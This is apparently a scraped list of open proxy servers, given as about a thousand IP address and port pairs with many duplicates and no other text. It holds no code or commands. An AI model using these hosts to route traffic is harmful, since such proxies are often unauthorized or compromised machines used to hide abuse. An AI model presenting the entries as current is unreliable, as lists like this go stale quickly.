138.94.76.86:8080
190.6.23.218:999
41.65.236.35:1981
41.33.203.233:1975
35.207.123.94:80
123.182.59.235:8089
200.52.153.155:998
124.160.118.183:8080
87.247.251.240:3128
72.10.160.90:25639
167.99.174.59:80
162.55.95.91:2989
198.176.56.39:80
41.254.56.6:1981
103.39.51.21:8080
111.225.153.4:8089
72.10.160.93:27741
197.243.20.178:80
67.43.228.253:27933
103.165.157.7:8080
103.178.13.62:3030
72.10.160.90:2695
103.78.25.99:3128
177.234.226.85:1994
67.43.227.227:25957
141.145.214.176:80
61.19.145.66:8080
209.97.150.167:8080
143.198.226.25:80
212.80.216.248:3128
67.43.227.227:9267
187.40.1.123:128
109.70.189.30:38880
67.43.236.20:18859
196.251.128.117:8080
81.250.111.16:80
162.55.95.91:29959
103.20.90.119:8581
181.188.206.62:999
167.235.185.47:6969
45.189.252.57:999
154.73.29.201:8080
103.191.196.58:3125
114.106.147.185:8089
49.0.91.7:8080
125.87.91.67:8089
187.95.82.175:3629
45.117.179.179:33164
10.22.236.103:16993
216.236.197.38:8031
102.132.56.56:8080
181.114.226.212:8080
172.233.39.238:3128
114.231.42.241:8089
162.214.225.223:31412
125.87.93.195:8089
41.217.240.225:8080
202.29.80.76:8080
188.126.45.150:8090
94.130.64.28:16093
94.130.64.28:16201
144.48.111.7:8674
51.38.49.98:53943
94.130.64.28:16204
103.157.116.186:8080
168.228.36.22:27234
94.130.64.28:16246
124.217.226.9:3128
162.214.225.223:41366
103.66.63.4:8080
103.148.45.81:8882
186.194.119.205:5566
94.130.64.28:16383
94.130.64.28:16249
94.130.64.28:16221
94.130.64.28:16073
94.130.64.28:16331
79.110.202.131:8081
94.130.64.28:16286
94.130.64.28:16094
94.130.64.28:16124
162.214.225.223:54535
94.130.64.28:16398
31.7.65.18:443
162.214.170.144:44024
91.221.240.20:1080
103.111.118.75:1080
94.130.64.28:16369
94.130.64.28:16119
162.214.170.144:56937
94.130.64.28:16399
162.214.225.223:54535
94.130.64.28:16128
119.93.43.16:8082
103.154.230.127:5678
103.110.10.189:8080
94.130.64.28:16243
94.130.64.28:16138
94.130.64.28:16075
94.130.64.28:16324
162.214.170.144:6243
162.214.225.223:38259
162.214.225.223:42410
94.130.64.28:16161
117.54.114.102:80
94.130.64.28:16164
94.130.64.28:16054
94.130.64.28:16373
94.130.64.28:16370
94.130.64.28:16143
94.130.64.28:16313
94.130.64.28:16234
91.241.21.237:9812
94.130.64.28:16311
94.130.64.28:16101
94.130.64.28:16284
94.130.64.28:16350
94.130.64.28:16364
94.130.64.28:16191
94.130.64.28:16131
94.130.64.28:16252
94.130.64.28:16283
94.130.64.28:16095
94.130.64.28:16141
94.130.64.28:16200
94.130.64.28:16312
94.130.64.28:16064
94.130.64.28:16092
94.130.64.28:16285
94.130.64.28:16314
94.130.64.28:16372
94.130.64.28:16147
94.130.64.28:16122
94.130.64.28:16319
61.19.109.236:8080
94.130.64.28:16213
94.130.64.28:16253
94.130.64.28:16134
94.130.64.28:16198
94.130.64.28:16228
94.130.64.28:16003
94.130.64.28:16340
94.130.64.28:16396
94.130.64.28:16192
94.130.64.28:16139
94.130.64.28:16057
94.130.64.28:16135
94.130.64.28:16203
94.130.64.28:16068
94.130.64.28:16193
94.130.64.28:16363
94.130.64.28:16090
188.132.221.179:8080
94.130.64.28:16298
94.130.64.28:16190
94.130.64.28:16170
94.130.64.28:16024
94.130.64.28:16219
94.130.64.28:16262
94.130.64.28:16096
94.130.64.28:16041
94.130.64.28:16031
94.130.64.28:16288
94.130.64.28:16066
94.130.64.28:16023
94.130.64.28:16126
94.130.64.28:16377
94.130.64.28:16017
94.130.64.28:16235
94.130.64.28:16354
94.130.64.28:16118
94.130.64.28:16300
94.130.64.28:16077
94.130.64.28:16148
94.130.64.28:16171
94.130.64.28:16222
94.130.64.28:16129
94.130.64.28:16397
94.130.64.28:16069
94.130.64.28:16105
94.130.64.28:16001
170.245.57.228:8080
194.87.188.114:8000
103.146.184.138:1111
183.166.137.190:41122
69.48.179.103:80
213.58.5.113:3128
125.87.93.37:8089
162.214.225.223:40656
162.214.225.223:35896
120.86.47.58:88
172.232.60.247:8080
103.174.81.66:8080
51.79.51.174:57119
51.83.132.102:22413
143.208.152.60:3180
207.127.92.145:3128
161.97.115.244:55683
79.110.194.117:8081
79.110.201.235:8081
91.121.163.199:38090
181.78.94.170:999
102.132.33.94:8080
5.161.220.242:3128
201.77.96.145:999
185.23.118.97:59405
191.97.15.18:999
12.188.160.158:80
169.255.198.8:5678
117.54.114.32:80
60.174.1.138:8089
165.227.196.37:62640
192.111.137.37:18762
199.188.92.69:8000
190.217.20.106:999
191.102.254.12:8081
167.179.45.56:4153
114.231.46.231:8089
5.161.58.226:3128
177.93.39.73:999
192.154.212.33:8000
102.213.22.59:8080
51.210.45.148:3865
183.165.224.125:8089
181.78.27.38:999
183.165.250.175:8089
184.181.217.194:4145
37.148.217.243:999
124.108.19.6:9292
72.167.222.102:32146
162.240.75.37:80
184.178.172.5:15303
212.127.93.185:8081
50.96.46.133:16099
103.10.22.234:8080
122.3.157.18:8095
41.128.89.85:1976
103.147.128.97:84
117.69.147.47:38801
185.95.227.244:4145
161.97.133.198:3128
77.232.21.4:8080
114.232.109.146:8089
176.253.53.25:80
213.171.44.82:3629
102.132.54.55:8080
117.54.114.33:80
69.167.169.46:61331
212.92.8.171:54469
72.167.221.36:50035
184.178.172.23:4145
59.98.4.70:8080
114.106.172.194:8089
162.214.225.223:37082
134.209.74.17:33745
212.126.102.146:43854
102.132.62.176:8080
124.106.150.231:8282
162.214.227.68:48358
103.162.91.116:3128
51.210.4.123:50683
103.148.51.19:8080
82.97.215.243:80
139.162.32.249:3128
103.162.54.118:8080
177.67.136.241:4153
192.163.204.80:3549
114.106.137.230:8089
102.132.54.151:8080
196.251.135.183:8080
199.102.107.145:4145
141.94.174.6:37057
213.170.117.15:8080
139.99.134.103:54006
117.54.114.98:80
175.29.174.242:10800
60.174.1.103:8089
114.106.171.128:8089
67.225.255.197:57752
114.106.147.56:8089
196.251.222.234:8104
162.214.225.223:34851
162.214.227.68:44533
162.214.227.68:33397
114.232.109.5:8089
45.77.47.244:4305
162.215.223.76:50112
162.215.223.71:58949
23.19.244.109:1080
35.178.206.159:8080
35.178.206.159:8080
192.162.232.15:1080
45.138.87.238:1080
35.178.206.159:8080
35.178.206.159:8080
31.170.22.127:1080
116.106.105.208:1080
162.55.87.48:5566
18.130.220.28:8193
18.130.220.28:8193
18.130.220.28:8193
18.130.220.28:8193
95.48.193.246:1080
176.214.78.230:5678
159.224.243.185:61303
92.204.134.38:54467
92.204.134.38:29718
212.69.128.72:5678
51.75.71.110:47503
187.252.154.90:4153
92.204.134.38:1555
185.82.218.52:1080
103.242.175.119:8899
146.59.18.246:20734
146.59.18.246:9986
146.59.18.246:49871
146.59.18.246:40975
176.113.157.149:37417
161.97.74.176:30000
81.16.1.71:5678
51.38.63.124:27294
185.90.101.36:7046
51.222.241.8:36219
54.36.122.16:44587
200.58.182.89:4153
37.187.91.192:21981
206.42.40.0:5678
152.228.140.225:64251
103.126.173.201:1080
37.187.91.192:17605
92.204.134.38:43044
152.228.140.225:64251
146.59.18.246:9986
194.163.129.90:43076
165.227.104.122:58839
194.163.129.90:43076
198.12.255.193:22785
198.57.229.185:64767
165.227.104.122:41443
51.222.241.8:7822
92.204.134.38:7785
164.92.86.113:57391
95.31.5.29:51528
92.204.134.38:59727
31.200.242.201:15755
51.75.126.150:51713
92.205.61.38:48664
92.205.61.38:21286
185.97.114.179:3629
45.138.87.238:1080
92.204.134.38:28695
51.75.125.208:48114
92.205.28.245:8560
176.99.2.43:1080
104.238.111.107:5484
37.18.73.60:5566
165.227.196.37:61899
162.55.87.48:5566
132.148.245.55:22508
192.169.226.96:32074
50.63.12.101:61797
185.109.184.150:54565
137.184.182.145:26114
138.197.92.110:2312
91.201.240.84:5678
162.241.137.197:32930
54.36.122.16:29796
51.89.173.40:40179
203.170.146.146:4153
146.59.18.246:49871
192.163.202.88:40886
132.148.167.243:6592
91.211.100.35:44744
159.223.71.71:59159
166.0.232.122:29568
117.74.65.207:54466
162.241.53.72:47856
51.89.173.40:54570
146.59.147.11:62801
51.79.87.144:30464
154.12.253.232:12263
132.148.154.97:27222
179.27.86.36:4153
51.79.87.144:54395
198.12.255.193:6821
31.200.242.201:4531
92.204.134.38:34261
23.19.244.109:1080
35.178.206.159:8080
209.14.112.10:1080
45.144.30.205:443
31.170.22.127:1080
45.144.30.205:443
92.42.8.22:4153
92.205.61.38:29249
92.204.134.38:59727
146.59.18.246:64741
104.238.111.107:7757
78.90.252.7:4153
95.128.142.76:1080
130.193.123.34:5678
107.180.101.226:35316
74.56.228.180:4145
176.120.32.135:5678
94.23.220.136:29295
64.64.152.248:39593
162.214.191.59:33977
208.109.14.49:34700
95.48.193.246:1080
66.228.35.209:44809
92.204.134.38:7785
45.226.1.1:4153
92.204.134.38:1555
146.59.18.246:64741
161.97.147.193:43131
190.54.12.74:5678
91.150.77.57:56921
181.129.62.2:47377
67.227.186.83:63716
104.238.111.107:15419
77.241.20.215:55915
107.180.90.248:40330
164.92.237.188:63722
132.148.167.243:40961
92.204.134.38:15393
41.184.212.3:4153
138.197.92.110:2312
41.73.253.234:4145
164.52.42.2:4145
148.72.206.84:2536
5.188.66.181:8088
66.228.33.190:14791
92.204.134.38:56177
162.243.55.12:59179
195.138.73.54:31145
177.8.170.122:1080
95.31.35.210:3629
107.180.88.173:58620
213.16.81.182:35559
91.201.240.84:5678
152.228.140.225:56351
192.162.232.15:1080
188.64.113.104:1080
91.134.140.160:3985
89.41.106.8:4145
93.90.212.2:4153
18.130.220.28:8193
45.138.87.238:1080
212.79.107.116:5678
165.227.196.37:58628
148.72.209.174:62572
146.59.18.246:9986
173.224.20.136:5678
94.131.14.66:1080
54.36.122.16:29796
62.103.186.66:4153
103.133.222.170:443
91.203.114.71:42905
92.205.61.38:4300
146.59.18.246:15860
51.15.132.215:16379
123.253.124.28:5678
103.127.63.57:5678
202.70.80.153:5678
45.115.1.14:5678
96.36.50.99:39593
213.226.11.149:59086
103.126.173.201:1080
198.57.195.42:17986
103.141.189.62:5678
192.169.205.131:38981
162.241.53.72:34099
105.234.148.192:4145
198.89.91.42:5678
103.4.118.130:5678
163.172.153.194:16379
162.214.90.49:59997
189.203.181.34:1080
162.214.103.84:14722
23.19.244.109:1080
35.178.206.159:8080
192.162.232.15:1080
31.170.22.127:1080
92.204.134.38:28695
45.138.87.238:1080
167.172.159.43:1162
162.214.103.84:14722
45.144.30.205:443
162.240.147.48:47242
185.109.184.150:54565
92.204.134.38:42674
213.32.252.134:5678
91.224.179.175:5678
92.205.61.38:24183
50.199.46.20:32100
51.89.173.40:60775
195.78.100.186:3629
92.204.134.38:1555
51.75.126.150:15474
212.156.217.147:4153
162.241.50.179:37876
41.223.108.13:1080
92.204.134.38:42571
50.250.75.153:39593
109.238.12.156:26912
181.209.96.226:4153
192.99.207.129:29360
185.43.249.148:39316
103.35.189.217:1080
92.205.61.38:4300
51.222.241.8:7822
185.43.189.182:3629
118.179.195.20:4145
91.134.140.160:3985
46.173.35.229:3629
92.205.61.38:50903
89.41.106.8:4145
162.241.70.64:57527
51.15.254.129:16379
83.56.15.57:5678
92.205.61.38:21286
209.126.104.38:30632
107.180.90.88:63100
51.161.99.113:58211
104.238.111.107:60214
115.242.204.122:5678
51.75.71.110:47503
46.8.60.2:1080
146.59.18.246:49871
148.72.206.84:32347
36.94.110.49:5678
196.44.181.37:5678
37.32.98.160:54647
104.248.158.78:43620
146.59.18.246:20734
162.55.87.48:5566
92.205.61.38:29249
104.238.111.107:53777
167.172.159.43:1162
62.109.0.18:24302
209.142.64.219:39789
92.205.61.38:36073
207.244.254.30:16491
92.205.108.94:40994
67.205.177.122:40448
154.16.116.166:39759
36.91.45.12:51299
51.75.126.150:36323
92.204.135.203:61635
152.228.140.225:64251
103.40.122.194:1080
147.124.212.31:36779
162.241.53.72:34099
50.63.13.3:60315
162.241.79.22:50207
167.86.69.142:34891
50.235.117.234:39593
165.227.196.37:53718
8.42.68.125:39593
162.210.192.136:17342
5.135.137.13:59124
67.205.177.122:40448
162.241.50.179:62192
45.138.87.238:1080
195.168.91.238:4153
31.170.22.127:1080
176.120.32.135:5678
91.241.131.179:9834
203.205.34.58:5678
222.165.234.147:52667
54.36.122.16:44587
213.21.56.20:4153
103.242.175.119:7891
51.89.173.40:60775
109.238.12.156:28618
200.29.109.112:14888
51.89.21.99:16257
148.72.212.198:40188
51.75.71.110:47503
83.220.46.106:4145
176.118.46.24:1080
148.72.206.84:2536
50.63.12.33:50781
222.223.112.59:10800
92.204.134.38:1555
192.162.232.15:1080
190.3.72.38:3629
92.204.134.38:42674
212.115.232.79:10800
192.163.200.200:19747
197.157.254.34:4145
162.241.46.40:62244
72.167.8.5:44774
51.158.108.165:16379
35.178.206.159:8080
176.99.2.43:1080
103.17.90.6:5678
104.238.111.107:8968
162.214.90.49:51918
172.93.111.87:61645
107.180.90.248:7698
162.214.102.195:56342
185.245.38.200:4145
121.139.218.165:43295
94.247.241.70:51006
45.70.206.33:4145
104.238.111.107:7757
12.11.59.114:1080
103.68.3.114:4145
184.168.121.153:52650
138.197.92.110:4527
103.225.125.161:4153
190.2.104.201:4153
37.187.91.192:27898
103.121.195.12:61221
194.31.79.75:29671
162.144.121.232:16795
132.148.167.243:6592
88.213.214.254:4145
108.175.24.1:13135
23.19.244.109:1080
95.178.108.189:5678
170.80.33.103:5678
200.43.231.4:4153
185.196.176.77:4145
45.144.30.205:443
146.59.18.246:28596
5.252.23.206:1080
115.242.204.122:5678
51.15.142.4:16379
186.96.124.242:4153
194.190.169.197:3701
195.138.65.34:5678
116.118.98.21:5678
67.205.177.122:21108
162.214.90.49:57785
51.79.87.144:22500
92.204.134.38:7785
5.252.23.220:1080
186.248.87.172:5678
103.51.46.2:4145
195.140.226.32:5678
67.227.186.23:64153
89.151.251.50:32000
31.43.33.56:4153
51.89.173.40:17982
92.205.28.245:8560
185.43.249.148:39316
132.148.245.112:49824
193.106.57.96:5678
189.203.181.34:1080
195.9.146.246:3629
146.59.18.246:9986
94.131.107.45:1080
203.161.32.242:61356
200.70.34.22:4153
162.241.50.179:37876
92.204.134.38:25825
5.58.47.25:3629
51.222.241.8:49559
187.62.89.252:4153
187.252.154.90:4153
51.75.126.150:36323
23.19.244.109:1080
31.170.22.127:1080
146.59.18.246:49871
35.178.206.159:8080
45.138.87.238:1080
5.252.23.206:1080
5.252.23.220:1080
37.187.73.7:12582
47.180.63.37:54321
54.39.50.68:26303
45.81.232.17:17639
86.110.189.118:42539
51.79.87.144:22500
62.171.169.37:58402
92.204.134.38:1555
45.128.133.199:1080
95.48.193.246:1080
93.182.76.244:5678
51.222.241.8:7822
51.15.230.100:16379
51.89.173.40:17982
49.229.36.210:4153
50.192.49.195:32100
92.204.134.38:54467
46.34.144.199:4153
82.130.202.219:43429
81.16.1.71:5678
65.49.67.161:48324
80.241.44.34:5678
51.79.87.144:54395
51.158.77.220:16379
82.204.198.28:1080
88.202.230.103:13638
92.205.61.38:64272
92.205.61.38:4300
92.204.134.38:25675
92.204.134.38:7785
92.205.61.38:24663
92.205.61.38:36073
92.205.108.94:40994
92.204.134.38:42674
92.205.61.38:29249
92.205.61.38:4726
92.205.61.38:50903
144.76.96.180:5566
95.31.35.210:3629
92.205.61.38:48664
101.109.41.137:4153
92.204.134.38:43044
95.178.108.189:5678
103.35.189.217:1080
138.255.240.66:40736
108.175.24.1:13135
154.16.116.166:42655
103.141.189.62:5678
192.162.232.15:1080
111.68.127.170:4153
146.59.18.246:9986
138.197.92.110:4527
135.148.10.161:42881
116.118.98.9:5678
103.215.72.115:5678
176.214.78.230:5678
162.144.121.232:16795
162.241.46.40:62244
116.106.105.208:1080
35.178.206.159:8080
132.148.167.243:17702
139.162.238.184:55482
150.129.57.251:4153
190.54.12.74:5678
165.227.196.37:53718
146.59.18.246:9755
162.241.45.22:57001
162.214.197.102:42019
128.199.221.91:8004
162.214.121.173:52577
162.214.170.144:16684
146.59.18.246:40975
146.59.18.246:30673
165.227.104.122:41443
146.59.18.246:64741
146.59.18.246:28596
166.62.88.163:26190
23.19.244.109:1080
209.126.104.38:30632
201.159.103.97:31337
203.161.32.242:55761
162.214.103.84:14722
178.79.165.164:63214
31.170.22.127:1080
206.42.40.0:5678
92.205.61.38:36073
207.180.198.241:13168
185.23.118.252:55158
162.241.70.64:57527
194.226.164.214:1080
198.12.255.193:40099
66.228.35.209:44809
162.144.103.99:61329
51.89.173.40:51612
186.97.172.178:5678
212.156.217.147:4153
14.241.182.44:5678
202.6.224.51:1080
198.57.195.42:31683
45.138.87.238:1080
132.148.16.169:27718
198.57.195.42:38242
5.135.137.13:59124
162.240.147.48:37704
166.0.232.122:29568
92.205.108.94:38349
173.212.209.49:39522
184.168.121.153:52650
132.148.245.112:14103
105.214.72.106:5678
146.59.18.246:40975
92.204.134.38:42571
51.89.173.40:11058
185.97.114.179:3629
162.241.46.54:58330
192.169.244.80:41568
162.214.227.68:31686
31.200.242.201:12196
24.172.34.114:60133
45.70.206.33:4145
206.189.184.213:35398
89.41.106.8:4145
92.204.134.38:28695
51.38.63.124:10983
138.197.92.110:4527
167.172.159.43:1162
95.48.193.246:1080
185.236.46.221:5678
203.190.8.59:1088
94.23.220.136:21062
91.211.100.35:44744
162.55.87.48:5566
31.200.242.201:4531
37.187.91.192:27898
163.172.144.132:16379
132.148.245.55:22508
51.158.105.107:16379
12.7.109.1:8899
162.210.192.136:17342
151.236.39.7:58266
23.19.244.109:1080
35.178.206.159:8080
181.143.21.146:4153
31.170.22.127:1080
213.226.11.149:59086
45.138.87.238:1080
31.163.204.200:4153
81.17.94.50:47163
49.229.36.210:4153
41.160.23.114:4153
93.182.76.244:5678
36.89.10.51:44268
176.241.89.244:50547
95.143.8.182:50285
101.109.41.137:4153
45.144.30.205:443
92.204.134.38:25675
162.214.227.68:31686
45.144.30.205:443
162.214.103.84:14722
35.154.71.72:1080
51.89.173.40:60775
146.59.18.246:20734
146.59.18.246:9755
51.38.63.124:27294
66.228.37.252:29466
45.79.56.187:40114
165.227.196.37:53718
54.36.122.16:44587
213.16.81.147:5678
109.238.12.156:28618
162.240.147.48:47242
65.1.244.232:80
92.204.134.38:42674
146.59.18.246:40975
185.82.218.52:1080
159.224.243.185:61303
92.205.61.38:64272
165.227.104.122:41443
192.99.207.129:2542
184.168.121.153:52650
182.93.69.74:5678
5.252.23.249:1080
209.126.104.38:40750
132.148.167.243:48298
213.136.78.200:20256
165.227.196.37:63399
92.205.61.38:4726
103.66.177.17:32251
162.241.50.179:34099
50.199.46.20:32100
92.204.134.38:54467
103.35.189.217:1080
14.232.160.247:10801
92.204.134.38:7785
146.59.18.246:15860
92.205.61.38:24183
207.244.229.34:7976
159.192.97.129:5678
103.121.39.158:1080
173.212.237.43:57562
163.172.147.9:16379
51.79.87.144:54395
162.241.46.40:62244
92.204.134.38:51123
54.36.108.149:38949
198.12.253.239:38588
188.165.237.26:52982
109.232.106.150:52435
103.133.222.170:443
147.124.212.31:55361
116.118.98.21:5678
103.112.162.241:5678
162.214.170.144:25347
94.23.220.136:43751
162.210.192.136:17342
135.148.10.161:42881
104.238.111.107:5452
118.67.170.121:4153
103.95.97.42:4153
18.130.220.28:8193
146.59.18.246:9986
139.162.238.184:55482
162.241.53.72:34099
190.96.97.202:4153
162.241.46.6:64353
170.244.0.179:4145
165.227.104.122:41443
176.99.2.43:1080
35.178.206.159:8080
185.97.114.179:3629
173.224.20.136:5678
213.14.31.123:35314
174.136.57.169:33761
185.51.92.103:51327
188.164.197.178:11925
176.120.32.135:5678
188.133.160.22:4145
178.79.165.164:63214
185.220.174.99:17886
217.145.199.47:56746
190.104.213.175:1080
188.164.196.30:49426
185.32.4.65:4153
190.0.15.18:5678
186.248.87.172:5678
192.163.201.131:8896
195.168.91.238:4153
187.19.127.246:8011
192.99.207.129:26567
198.12.255.193:22785
38.91.107.224:62192
192.169.205.131:38981
209.142.64.219:39789
207.244.254.30:16491
37.187.91.192:11721
45.144.30.205:443
45.128.133.153:1080
37.228.65.107:51032
37.18.73.60:5566
45.187.76.2:3629
45.65.65.18:4145
5.252.23.249:1080
50.192.49.195:32100
58.75.126.235:4145
103.23.101.30:4145
51.178.73.51:43034
66.228.33.190:48487
109.232.106.150:52435
92.204.134.38:42571
67.227.186.23:64153
51.158.78.200:16379
92.204.134.38:51123
92.204.134.38:28695
62.109.0.18:24302
92.204.134.38:34261
92.204.134.38:1555
185.43.189.182:3629
92.204.134.38:42674
67.213.212.58:34228
65.49.67.161:48324
5.252.23.206:1080
81.17.94.50:47163
85.116.120.106:3629
95.178.108.189:5678
185.51.92.108:51327
176.99.2.43:1080
92.204.134.38:15393
50.197.210.138:32100
91.211.100.35:44744
92.205.61.38:21286
5.58.47.25:3629
181.205.230.58:4153
95.48.193.246:1080
94.131.107.45:1080
91.92.78.207:4145
80.51.7.66:4145
83.234.76.155:4145
92.205.61.38:24183
92.204.134.38:29718
185.97.114.179:3629
125.27.10.84:4153
185.46.170.253:4145
213.32.66.64:50163
94.23.252.168:9180
88.204.216.142:33156
114.141.61.5:4145
83.56.15.57:5678
94.232.11.178:58028
92.204.136.149:16066
41.223.108.13:1080
162.240.78.74:61792
36.89.229.97:50540
31.7.65.18:443
35.178.206.159:8080
18.130.220.28:8193
94.131.107.45:1080
38.91.107.224:62192
18.130.220.28:8193
78.90.252.7:4153
185.186.17.57:5678
92.204.134.38:42674
192.162.232.15:1080
45.65.65.18:4145
185.82.238.203:5678
92.204.134.38:7785
103.242.175.119:8899
146.59.18.246:9986
207.244.254.30:16491
103.113.71.230:1080
51.15.212.207:16379
51.89.173.40:54570
135.148.10.161:5607
190.211.161.210:32410
185.90.101.36:7046
51.38.63.124:27294
77.241.20.215:55915
187.252.154.90:4153
146.59.18.246:64741
51.89.173.40:23313
66.228.37.252:7841
192.169.226.96:46191
162.241.79.22:36197
45.144.30.205:443
5.252.23.249:1080
162.214.121.173:62976
51.38.63.124:10983
193.106.57.96:5678
92.204.134.38:34261
135.148.10.161:42881
188.164.196.30:49426
188.164.197.178:15452
51.75.126.150:15474
18.130.220.28:8193
109.248.236.150:9898
177.136.124.36:3629
95.178.108.189:5678
37.26.86.206:4145
185.79.241.34:42756
177.85.65.177:4153
190.54.12.74:5678
176.118.46.24:1080
170.244.0.179:4145
187.19.127.246:8011
200.85.52.254:5678
77.238.79.111:5678
130.193.123.34:5678
212.156.217.147:4153
103.174.36.112:5678
123.231.230.58:31196
51.161.99.114:48235
103.18.47.79:4145
213.250.198.66:4145
181.143.21.146:4153
203.210.235.91:5678
197.232.43.224:1080
181.129.198.58:5678
202.40.186.66:1088
49.229.36.210:4153
49.87.154.98:10800
103.221.254.102:54409
61.155.235.58:10800
103.242.175.119:8899
116.118.98.21:5678
18.130.220.28:8193
23.19.244.109:1080
154.16.116.166:2512
45.172.177.253:59341
31.170.22.127:1080
200.41.182.243:4145
45.138.87.238:1080
45.79.56.187:40114
138.197.92.110:38552
165.227.104.122:58839
162.241.158.204:58447
134.122.43.203:56442
165.227.196.37:63399
51.38.63.124:27294
135.148.10.161:6716
66.228.33.190:24360
209.142.64.219:39789
159.223.166.21:5199
94.182.26.44:4153
165.227.196.37:54266
162.214.170.144:16684
162.214.170.144:37362
67.225.255.197:55889
92.204.134.38:25675
159.148.146.65:5678
92.204.134.38:34261
104.37.175.206:53723
162.240.72.139:20270
162.241.6.97:52000
162.241.46.6:62244
162.240.147.48:37704
162.241.158.204:52000
187.210.136.88:4153
92.204.135.203:34780
92.204.134.38:42571
103.121.39.158:1080
103.242.175.119:8899
174.136.57.169:33761
92.204.135.203:29212
137.184.182.145:28357
135.148.10.161:31696
45.79.134.70:28866
176.113.157.149:37417
188.164.197.178:4026
132.148.245.169:19483
37.18.73.60:5566
85.89.184.87:5678
1.15.62.12:5678
154.12.255.155:64560
147.124.212.31:4671
181.212.136.34:42400
162.55.87.48:5566
162.241.6.97:52000
111.8.155.54:7777
111.8.155.54:7777
111.8.155.54:7777
111.8.155.54:7777
165.227.104.122:41443
45.81.232.17:30696
202.40.181.220:31247
162.214.197.102:57785
104.248.158.78:62952
107.180.90.88:20309
198.12.255.193:48572
50.63.13.3:60315
162.214.121.11:2993
50.63.13.3:50887
50.63.12.33:22450
37.32.98.160:7302
198.57.211.235:11096
185.95.227.244:4145
45.81.232.17:59421
201.174.17.126:7755
167.86.69.142:34891
104.37.175.206:53723
138.68.155.22:10760
159.223.166.21:5078
144.76.96.180:5566
166.62.38.100:39308
64.227.108.182:37220
12.89.124.138:4145
50.63.12.33:61464
111.8.155.54:7777
162.214.191.209:33977
104.238.111.107:36049
162.241.6.97:56399
209.126.104.38:39369
148.72.23.56:4833
132.148.20.70:18504
5.135.137.13:59124
162.241.45.22:50528
104.247.163.246:54094
166.62.38.100:54083
107.180.89.55:63136
103.47.216.19:4145
185.186.17.57:5678
162.241.53.72:40170
50.63.13.3:50887
50.63.12.33:30920
151.236.39.7:58111
46.29.116.6:4145
103.169.134.112:5678
162.241.46.40:62244
161.97.147.193:43131
148.72.206.131:45395
107.180.90.88:62908
103.242.175.119:8899
54.36.122.16:29796
5.252.23.220:1080
103.242.175.119:8899
161.97.173.42:41558
104.251.212.206:34012
24.37.245.42:51056
47.180.63.37:54321
51.158.124.167:16379
147.124.212.31:51825
209.126.104.38:40750
162.241.46.54:46849
104.238.111.107:45883
128.199.221.91:21605
198.12.255.193:22785
5.252.23.220:1080
162.241.46.6:46097
91.213.119.246:46024
46.226.148.105:9352
51.79.87.144:54395
148.72.206.84:14815
198.57.195.42:31683
111.8.155.54:7777
176.126.85.247:16379
95.143.12.201:60505
138.68.155.22:10760
162.241.158.204:62847
132.148.128.8:7392
213.136.79.177:13675
104.248.151.220:59755
163.172.153.194:16379
207.244.229.34:46497
176.126.85.247:16379
103.242.175.119:8899
162.241.50.179:31414
50.63.13.3:28732
159.223.166.21:49174
207.244.255.174:49675
51.15.132.215:16379
103.144.209.104:3629
162.214.75.86:52163
194.163.129.90:43076
91.142.222.84:22735
51.15.132.215:16379
163.172.165.36:16379
161.97.173.42:44479
163.172.147.9:16379
50.63.13.3:40129
148.72.212.198:26046
162.214.102.121:11293
162.241.45.22:50528
173.212.209.49:39522
154.72.73.214:1080
51.75.126.150:11802
31.24.44.92:60419
92.204.134.38:52929
181.143.21.146:4153
66.29.131.58:30060
51.75.126.150:37847
50.63.12.33:45134
148.72.23.56:4833
200.108.190.6:9800
54.38.179.162:7848
162.241.46.6:56241
148.66.130.53:5031
51.15.223.24:16379
95.48.193.246:1080
50.63.12.33:34644
51.89.173.40:55198
36.37.244.41:5678
162.215.219.157:41697
103.70.206.129:59311
148.72.41.47:40350
162.241.46.40:62592
162.214.121.173:35183
107.180.95.177:1405
54.36.122.16:44587
51.158.68.237:16379
132.148.245.169:36149
162.214.75.237:52327
185.161.186.133:54321
177.91.76.34:4153
51.161.99.114:48235
209.222.97.30:15805
50.63.12.33:40838
37.187.141.160:49039
163.172.129.251:16379
132.148.154.98:50965
92.205.110.118:49586
92.205.110.118:5513
51.89.173.40:51612
130.255.162.199:44740
185.66.88.86:57752
162.241.46.6:53477
104.238.111.107:15073
51.75.126.150:19693
203.96.177.211:55005
162.241.79.22:50207
82.223.121.72:11075
213.136.75.85:50573
162.241.46.40:49401
159.89.194.121:8738
51.15.223.12:16379
51.158.78.200:16379
162.240.19.133:56483
103.113.71.230:1080
50.63.12.33:31785
139.162.238.184:47310
92.204.135.37:26545
163.172.147.9:16379
51.254.220.248:55174
146.59.18.246:30673
164.92.86.113:52494
36.64.214.50:1080
162.144.32.209:36511
161.97.165.57:6484
148.72.23.56:42312
209.126.104.38:44412
50.63.12.33:23065
188.190.176.114:5678
51.75.71.110:11507
103.165.37.245:4145
148.72.206.84:2536
64.91.226.205:64441
51.161.33.206:2542
159.89.194.121:46377
162.241.50.179:49858
213.136.78.200:58283
185.82.218.52:1080
67.227.186.83:63716
62.171.131.101:1385
185.43.189.182:3629
45.81.232.17:30696
92.205.61.38:36073
162.243.55.12:50941
82.223.121.72:56002
209.126.104.38:44412
46.173.35.229:3629
185.163.195.167:4153
104.238.111.107:29015
198.12.255.193:28763
45.81.232.17:27855
92.205.108.94:40994
148.72.206.84:41691
45.81.232.17:33549
50.63.12.33:62592
173.212.209.49:64309
148.72.23.56:41383
107.180.90.248:40330
185.236.46.221:5678
37.26.86.206:4145
51.222.241.8:62916
131.161.68.41:35944
161.97.173.78:39820
167.86.102.169:16823
166.62.38.100:4765
161.97.163.52:23288
166.62.38.100:2522
103.127.56.236:5678
166.62.38.100:32216
200.70.56.204:4153
162.0.220.222:57020
107.180.88.173:36503
162.241.50.179:40170
43.243.141.198:228
82.137.245.41:1080
36.92.96.179:5678
166.62.85.184:21946
202.69.38.42:5678
51.15.241.5:16379
146.59.70.29:52276
5.135.137.13:59124
50.250.56.129:9898
92.205.60.110:32503
118.70.126.245:5678
181.212.136.34:5199
199.85.209.142:61430
88.204.216.142:33156
51.161.99.114:29758
164.92.86.113:63358
92.205.110.47:19600
198.12.255.193:53281
75.119.145.169:16216
150.107.207.137:57230
8.130.34.237:6666
194.163.159.94:35081
51.161.99.114:48235
162.240.21.140:30097
139.162.238.184:11227
103.47.93.244:1080
12.7.109.1:8899
164.92.237.188:59045
51.79.87.144:18636
207.180.198.241:17228
209.126.104.38:16608
67.205.177.122:24777
208.109.14.49:37377
164.92.237.188:57392
92.205.110.118:54440
165.227.104.122:29992
207.180.234.220:44437
94.23.220.136:35312
132.148.245.169:19483
83.220.46.106:4145
92.205.61.38:4300
157.245.48.119:11674
103.102.141.39:4145
